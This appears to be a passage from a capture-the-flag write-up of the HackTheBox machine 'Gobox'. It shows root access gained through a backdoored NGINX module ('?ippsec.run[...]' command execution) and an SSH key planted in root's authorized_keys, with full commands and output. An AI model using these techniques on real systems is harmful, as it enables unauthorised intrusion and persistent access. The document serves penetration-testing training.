<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ curl -sv http://10.10.11.113:4566/ -H <span class="s1">&#39;Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz&#39;</span>
*   Trying 10.10.11.113:4566...
* Connected to 10.10.11.113 <span class="o">(</span>10.10.11.113<span class="o">)</span> port <span class="m">4566</span> <span class="o">(</span><span class="c1">#0)</span>
&gt; GET / HTTP/1.1
&gt; Host: 10.10.11.113:4566
&gt; User-Agent: curl/7.74.0
&gt; Accept: */*
&gt; Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
&gt;
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 <span class="m">404</span>
&lt; Server: nginx
&lt; Date: Thu, <span class="m">09</span> Sep <span class="m">2021</span> 07:33:54 GMT
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
&lt; Content-Length: <span class="m">21</span>
&lt; Connection: keep-alive
&lt; access-control-allow-origin: *
&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
&lt; access-control-allow-headers: authorization,content-type,content-length,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging,amz-sdk-invocation-id,amz-sdk-request
&lt; access-control-expose-headers: x-amz-version-id
&lt;
* Connection <span class="c1">#0 to host 10.10.11.113 left intact</span>
<span class="o">{</span><span class="s2">&#34;status&#34;</span>: <span class="s2">&#34;running&#34;</span><span class="o">}</span>
</code></pre></div><p>As for port 80 and 8080, it&rsquo;s clear that they are the homepage and the login page site.</p>
<p>The next one is request routing for port 8000, this is my first time to see &ldquo;command on&rdquo; written on NGINX&rsquo;s config file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>When I try to interact with it, it returns nothing.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ curl -s http://127.0.0.1:8000
www-data@gobox:/opt$ curl -I http://127.0.0.1:8000
curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
</code></pre></div><p>With <code>nc</code>, it returns a &ldquo;Bad Request&rdquo;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/$ nc -vn 127.0.0.1 <span class="m">8000</span>
Connection to 127.0.0.1 <span class="m">8000</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
/
HTTP/1.1 <span class="m">400</span> Bad Request
Server: nginx
Date: Wed, <span class="m">08</span> Sep <span class="m">2021</span> 11:13:48 GMT
Content-Type: text/html
Content-Length: <span class="m">150</span>
Connection: close

&lt;html&gt;
&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre></div><p>If I look at the date modified of the NGINX folder, there are 6 folders that were modified on August 26 at the same time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -lt
total <span class="m">64</span>
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snippets
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-available
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-enabled
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-enabled
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 conf.d
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-available
-rw-r--r-- <span class="m">1</span> root root <span class="m">1484</span> Aug <span class="m">24</span> 20:30 nginx.conf
-rw-r--r-- <span class="m">1</span> root root <span class="m">3071</span> Feb  <span class="m">4</span>  <span class="m">2019</span> win-utf
-rw-r--r-- <span class="m">1</span> root root <span class="m">1077</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi.conf
-rw-r--r-- <span class="m">1</span> root root <span class="m">1007</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi_params
-rw-r--r-- <span class="m">1</span> root root <span class="m">2837</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-utf
-rw-r--r-- <span class="m">1</span> root root <span class="m">2223</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-win
-rw-r--r-- <span class="m">1</span> root root <span class="m">3957</span> Feb  <span class="m">4</span>  <span class="m">2019</span> mime.types
-rw-r--r-- <span class="m">1</span> root root  <span class="m">180</span> Feb  <span class="m">4</span>  <span class="m">2019</span> proxy_params
-rw-r--r-- <span class="m">1</span> root root  <span class="m">636</span> Feb  <span class="m">4</span>  <span class="m">2019</span> scgi_params
-rw-r--r-- <span class="m">1</span> root root  <span class="m">664</span> Feb  <span class="m">4</span>  <span class="m">2019</span> uwsgi_params
</code></pre></div><p>When I visit the <code>modules-enabled</code> folder, I find a module with a suspicious name &ldquo;backdoor&rdquo;!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -l modules-enabled
total <span class="m">12</span>
-rw-r--r-- <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 20:50 50-backdoor.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">61</span> Aug <span class="m">23</span> 14:43 50-mod-http-image-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-image-filter.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">60</span> Aug <span class="m">23</span> 14:43 50-mod-http-xslt-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 14:43 50-mod-mail.conf -&gt; /usr/share/nginx/modules-available/mod-mail.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">50</span> Aug <span class="m">23</span> 14:43 50-mod-stream.conf -&gt; /usr/share/nginx/modules-available/mod-stream.conf
</code></pre></div><p>The module loads a <code>.so</code> file called <code>ngx_http_execute_module.so</code>. I found that file under <code>/usr/lib/nginx/modules/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ cat modules-enabled/50-backdoor.conf
load_module modules/ngx_http_execute_module.so
www-data@gobox:/etc/nginx$ find / -type f -name <span class="s2">&#34;ngx_http_execute_module.so&#34;</span> 2&gt;/dev/null
/usr/lib/nginx/modules/ngx_http_execute_module.so
www-data@gobox:/etc/nginx$ file /usr/lib/nginx/modules/ngx_http_execute_module.so
/usr/lib/nginx/modules/ngx_http_execute_module.so: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, BuildID<span class="o">[</span>sha1<span class="o">]=</span>4279ae42bf642b21378aa43c06b52f4d0b89f2ad, with debug_info, not stripped
</code></pre></div><p>I&rsquo;m trying to find the origin of this module by grabbing some readable code using  <code>strings</code>. It turns out the backdoor is taken from this Github repository: <a href="https://github.com/limithit/NginxExecute">NginxExecute</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.97»
$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;.c$&#39;</span>
ngx_pcalloc
__ctype_b_loc
realloc
malloc
ngxexecute_strncpy_alloc
ngxexecute_strcpy_alloc
~iHc
/home/ubuntu/NginxExecute//ngx_result.c
7src
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="nginx-backdoor">NGINX Backdoor</h4>
<p>According to the README file from the repository, I just need to send a HTTP request with <code>?system.run[command]</code>, but it doesn&rsquo;t work here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -v <span class="s2">&#34;http://127.0.0.1:8000/?system.run[whoami]&#34;</span>
* Trying 127.0.0.1:8000...
* TCP_NODELAY <span class="nb">set</span>
* Connected to 127.0.0.1 <span class="o">(</span>127.0.0.1<span class="o">)</span> port <span class="m">8000</span> <span class="o">(</span><span class="c1">#0)</span>
&gt; GET /?system.run<span class="o">[</span>ifconfig<span class="o">]</span> HTTP/1.1
&gt; Host: 127.0.0.1:8000
&gt; User-Agent: curl/7.68.0
&gt; Accept: */*
&gt;
* Empty reply from server
* Connection <span class="c1">#0 to host 127.0.0.1 left intact</span>
curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
</code></pre></div><p>Running another <code>strings</code> command against the backdoor reveals it uses <code>ippsec.run</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.97»
$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;run&#39;</span>
ippsec.run
</code></pre></div><p>Now if I send <code>?ippsec.run[whoami]</code>, it returns:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[whoami]&#34;</span>
root
</code></pre></div><p>Using the previous reverse shell script I dropped on <code>/tmp/</code>, I can get an interactive shell access as root, but then the shell gets exited by itself.</p>
<p><div class="img-container"><img src="imgs/image-20210908184311943.png" alt="image-20210908184311943"  /></div>
</p>
<p>So instead, I will inject my SSH public key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39;</span> &gt; /tmp/iamf
www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[cat /tmp/iamf | tee /root/.ssh/authorized_keys]&#34;</span>
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H
</code></pre></div><p>Now I can SSH login as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ ssh root@10.10.11.113
Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-81-generic x86_64<span class="o">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed <span class="m">08</span> Sep <span class="m">2021</span> 11:52:18 AM UTC

  System load:                      0.0
  Usage of /:                       37.1% of 9.72GB
  Memory usage:                     20%
  Swap usage:                       0%
  Processes:                        <span class="m">244</span>
  Users logged in:                  <span class="m">0</span>
  IPv4 address <span class="k">for</span> br-bb21b8b9b286: 172.28.0.1
  IPv4 address <span class="k">for</span> docker0:         172.17.0.1
  IPv4 address <span class="k">for</span> ens160:          10.10.11.113


<span class="m">0</span> updates can be applied immediately.


The list of available updates is more than a week old.
To check <span class="k">for</span> new updates run: sudo apt update

Last login: Thu Aug <span class="m">26</span> 23:56:12 <span class="m">2021</span>
root@gobox:~#
</code></pre></div><p>I can grab the root flag as well.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# ls -l
total <span class="m">12</span>
-rwxr-xr-x <span class="m">1</span> root root  <span class="m">536</span> Aug <span class="m">24</span> 20:33 iptables.sh
-rw------- <span class="m">1</span> root root   <span class="m">33</span> Aug <span class="m">26</span> 21:10 root.txt
drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snap
root@gobox:~# cat root.txt
81d35...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h2 id="explore">Explore</h2>
<h3 id="undetected-ports">Undetected ports</h3>
<p>During enumeration, when I printed the networking status, I noticed that ports 9000, 9001, and 4566 should be accessible from external, with the exception that port 4566 needs an authentication header set first to be accessible.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ netstat -tlpn
<span class="o">(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span class="o">)</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
</code></pre></div><p>It turns out there is a set of <code>iptables</code> rules which drop any connection coming to these ports.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# iptables -L
Chain INPUT <span class="o">(</span>policy ACCEPT<span class="o">)</span>
target     prot opt <span class="nb">source</span>               destination         
ACCEPT     all  --  localhost/8          anywhere            
ACCEPT     all  --  172.16.0.0/12        anywhere            
DROP       tcp  --  anywhere             anywhere             tcp dpt:9002
DROP       tcp  --  anywhere             anywhere             tcp dpt:9001
DROP       tcp  --  anywhere             anywhere             tcp dpt:9000
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p><em>Shouldn&rsquo;t it then return with <code>filtered</code> status?</em></p>
<p>Well, I think it was purely my mistake. I used <code>--min-rate=10000</code>, so this could be the reason <code>nmap</code> misidentified the filtered port as closed.</p>
<h3 id="gobox-request-routing">Gobox Request Routing</h3>
<p>The first time I looked into the NGINX configuration file, it didn&rsquo;t make sense to me why my web shell is on the host OS? In fact, I uploaded my web shell to an S3 bucket, which is also a container.</p>
<p>Now, with root access obtained, I could understand what was happening, and there was a synchronization process between the host and the LocalStack container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# cat /var/spool/incron/root 
/opt/deploy/.localstack/data/recorded_api_calls.json    IN_MODIFY       /usr/bin/aws --endpoint-url http://127.0.0.1:9000 s3 sync s3://website /opt/website
/home/ubuntu/user.txt   IN_MODIFY       cp /home/ubuntu/user.txt /var/www/
</code></pre></div><p>So if I upload something into the bucket, the host will have it as well.</p>
<p>I also looked at how the web routing is done in this box and eventually visualize it as shown below:</p>
<p><div class="img-container"><img src="imgs/image-20210912193743912.png" alt="image-20210912193743912"  /></div>
</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
